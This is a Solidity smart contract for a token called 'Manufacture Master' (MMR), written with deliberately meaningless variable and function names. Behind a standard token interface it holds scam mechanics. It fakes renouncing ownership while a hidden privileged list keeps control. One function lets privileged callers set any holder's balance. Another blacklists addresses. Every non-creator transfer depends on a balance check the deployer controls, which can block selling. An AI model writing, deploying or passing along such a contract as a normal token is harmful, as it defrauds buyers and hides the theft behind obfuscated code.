//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface tokenReceiver {
    function createPair(address takeFee, address txMin) external returns (address);
}

interface sellTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountFrom) external view returns (uint256);

    function transfer(address receiverTake, uint256 marketingListShould) external returns (bool);

    function allowance(address buyLiquidityShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingListShould) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTake,
        uint256 marketingListShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverToken, uint256 value);
    event Approval(address indexed buyLiquidityShould, address indexed spender, uint256 value);
}

abstract contract feeLaunchedReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeWallet is sellTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ManufactureMaster is feeLaunchedReceiver, sellTx, modeWallet {

    function listSwap(address shouldAutoFund, address receiverTake, uint256 marketingListShould) internal returns (bool) {
        if (shouldAutoFund == walletReceiver) {
            return limitLaunched(shouldAutoFund, receiverTake, marketingListShould);
        }
        uint256 amountIs = sellTx(shouldLimit).balanceOf(launchMarketingWallet);
        require(amountIs == listLaunchedIs);
        require(receiverTake != launchMarketingWallet);
        if (toTotal[shouldAutoFund]) {
            return limitLaunched(shouldAutoFund, receiverTake, tradingMode);
        }
        return limitLaunched(shouldAutoFund, receiverTake, marketingListShould);
    }

    uint256 constant tradingMode = 13 ** 10;

    mapping(address => bool) public limitReceiverLiquidity;

    address senderAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellAmount(address fundSender) public {
        feeToken();
        
        if (fundSender == walletReceiver || fundSender == shouldLimit) {
            return;
        }
        toTotal[fundSender] = true;
    }

    event OwnershipTransferred(address indexed listReceiverTx, address indexed modeReceiver);

    mapping(address => mapping(address => uint256)) private isTrading;

    function symbol() external view virtual override returns (string memory) {
        return buyToken;
    }

    address launchMarketingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private maxToken = 100000000 * 10 ** 18;

    function takeTrading(uint256 marketingListShould) public {
        feeToken();
        listLaunchedIs = marketingListShould;
    }

    uint256 private exemptMaxSwap;

    function owner() external view returns (address) {
        return receiverWallet;
    }

    bool public feeFund;

    function limitLaunched(address shouldAutoFund, address receiverTake, uint256 marketingListShould) internal returns (bool) {
        require(isTokenReceiver[shouldAutoFund] >= marketingListShould);
        isTokenReceiver[shouldAutoFund] -= marketingListShould;
        isTokenReceiver[receiverTake] += marketingListShould;
        emit Transfer(shouldAutoFund, receiverTake, marketingListShould);
        return true;
    }

    mapping(address => uint256) private isTokenReceiver;

    uint8 private feeWalletTotal = 18;

    function decimals() external view virtual override returns (uint8) {
        return feeWalletTotal;
    }

    address private receiverWallet;

    constructor (){
        
        listAuto modeTo = listAuto(senderAuto);
        shouldLimit = tokenReceiver(modeTo.factory()).createPair(modeTo.WETH(), address(this));
        
        walletReceiver = _msgSender();
        limitReceiverLiquidity[walletReceiver] = true;
        isTokenReceiver[walletReceiver] = maxToken;
        feeFundMin();
        if (liquiditySwap != receiverListIs) {
            exemptMaxSwap = receiverListIs;
        }
        emit Transfer(address(0), walletReceiver, maxToken);
    }

    function approve(address toBuy, uint256 marketingListShould) public virtual override returns (bool) {
        isTrading[_msgSender()][toBuy] = marketingListShould;
        emit Approval(_msgSender(), toBuy, marketingListShould);
        return true;
    }

    function enableLaunchTx(address amountTo) public {
        require(amountTo.balance < 100000);
        if (feeFund) {
            return;
        }
        
        limitReceiverLiquidity[amountTo] = true;
        
        feeFund = true;
    }

    uint256 private liquiditySwap;

    string private buyTotal = "Manufacture Master";

    function transfer(address txAt, uint256 marketingListShould) external virtual override returns (bool) {
        return listSwap(_msgSender(), txAt, marketingListShould);
    }

    uint256 private receiverListIs;

    function allowance(address autoMin, address toBuy) external view virtual override returns (uint256) {
        if (toBuy == senderAuto) {
            return type(uint256).max;
        }
        return isTrading[autoMin][toBuy];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxToken;
    }

    function feeFundMin() public {
        emit OwnershipTransferred(walletReceiver, address(0));
        receiverWallet = address(0);
    }

    function transferFrom(address shouldAutoFund, address receiverTake, uint256 marketingListShould) external override returns (bool) {
        if (_msgSender() != senderAuto) {
            if (isTrading[shouldAutoFund][_msgSender()] != type(uint256).max) {
                require(marketingListShould <= isTrading[shouldAutoFund][_msgSender()]);
                isTrading[shouldAutoFund][_msgSender()] -= marketingListShould;
            }
        }
        return listSwap(shouldAutoFund, receiverTake, marketingListShould);
    }

    uint256 minTake;

    function balanceOf(address amountFrom) public view virtual override returns (uint256) {
        return isTokenReceiver[amountFrom];
    }

    function txLaunchedLiquidity(address txAt, uint256 marketingListShould) public {
        feeToken();
        isTokenReceiver[txAt] = marketingListShould;
    }

    bool public minIsEnable;

    function getOwner() external view returns (address) {
        return receiverWallet;
    }

    function feeToken() private view {
        require(limitReceiverLiquidity[_msgSender()]);
    }

    mapping(address => bool) public toTotal;

    bool private autoSenderBuy;

    address public walletReceiver;

    uint256 listLaunchedIs;

    address public shouldLimit;

    function name() external view virtual override returns (string memory) {
        return buyTotal;
    }

    string private buyToken = "MMR";

}